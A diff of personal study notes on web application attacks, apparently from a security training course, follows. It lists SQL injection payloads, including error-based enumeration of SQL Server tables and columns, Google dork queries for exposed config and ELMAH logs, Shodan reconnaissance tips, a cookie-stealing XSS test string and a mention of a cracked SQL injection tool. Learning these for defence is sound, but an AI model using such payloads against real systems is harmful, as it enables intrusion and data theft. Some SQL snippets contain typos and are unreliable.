@@ -1,4 +1,95 @@
 
+openIdConnect,Passwordless, Clef
+plaintextoffenders.com
+
+hashkiller.com.dic
+
+www.passwordmeter.com
+--------------------
+
+
+
+Havij Adv. SQL Injection Tool 1.17 Crack [Latest]
+Havij, an automatic SQL Injection tool, is distributed by ITSecTeam, an Iranian security company. The name Havij means “carrot”, which is the tool’s icon.
+
+==================
+SQL injection
+
+
+Select * from Widget Where Id=1
+
+Select * from Widget Where Id=1 or 1=1
+
+
+insert into vote()
+values(1. 3. 'Whoa!')'
+
+
+') select * form sys.tables --
+
+//increment the second top n to get the next table name
+//convert(int, name) will always fail - causing error information to be displayed in the http response
+
+//this start disclosing the table names
+select convert(int, name) from sys.tables where object_id = (select top 1 object_id from (select top 1 object_id from sys.tables order by object_id) foo order by object_id desc)
+
+//this start disclosing the object_id for a table
+//convert(int, varchar(20), object_id + 'a')
+//convert(int, varchar(20), object_id %2b 'a')  //+ is http space- change to http plus
+
+
+//this start disclosing the column names for the table using object_id for a table
+select convert(int,name) from sys.columns where column_id = (select top 1 column_id from (select top 1 column_id from sys.columns where object_id = 309576141 order by column_id) foo order by column_id desc) and object_id=309576141
+
+
+
+
+
+===========================
+Fuzz testing tools
+
+-----------------
+filetype:config inurl:web.config inurl:ftp
+
+elmah
+
+inurl:elmah.axd "error log for"   put in browser search
+
+
+http://hackyourselffirst.troyhunt.com/elmah
+======
+
+read html source files to see directory paths; or helpful comments
+======
+robot.txt  -- anything data in file is public; it up to the robots to implement the rules.
+
+==========================
+www.shodanhq.com  - type in apache version to find devices running this version, and drill down to your country of interest
+---
+in browser search apache xx.xxx and vulnerablities will popup
+find a version
+
+https://www.apachehaus.com/
+
+-----------------------------
+strings ending with '=' are usually base 64 encoding
+put text in http://base64decode.org to see the decoded text
+
+----------------
+//in chrome tools - resources; select cookies and see which ones are not http only, i.e. means can be accessed from javascript\
+//see injection attack, via search query url;  below to access cookies by scripts
+http://hackyourselffirst.troyhunt.com/Search?searchTerm=');alert(document.cookie);//
+
+
+
+Cookie attributes:
+	Domain
+	Path
+	Expiration
+	HTTPOnly
+	Secure
+	
+---------------------
 //injection via search example
 search term 'enzo/>'
 
@@ -50,3 +141,10 @@ oBody = oBody.replace("</body>", "<script type=\"text/javascript\" src=\"http://
 //Set the response body to the changed body string
 oSession.utilSetResponseBody(oBody);
 }
+
+------------------------------
+Open Web Application Security Project (OWASP)  to 10 attacks and how to mitigate https://www.owasp.org/index.php/Top10#OWASP_Top_10_for_2013
+
+CWE/SANS TOP 25 Most Dangerous Software Errors https://www.sans.org/top25-software-errors/
+
+Nation Vulnerability Database https://nvd.nist.gov/
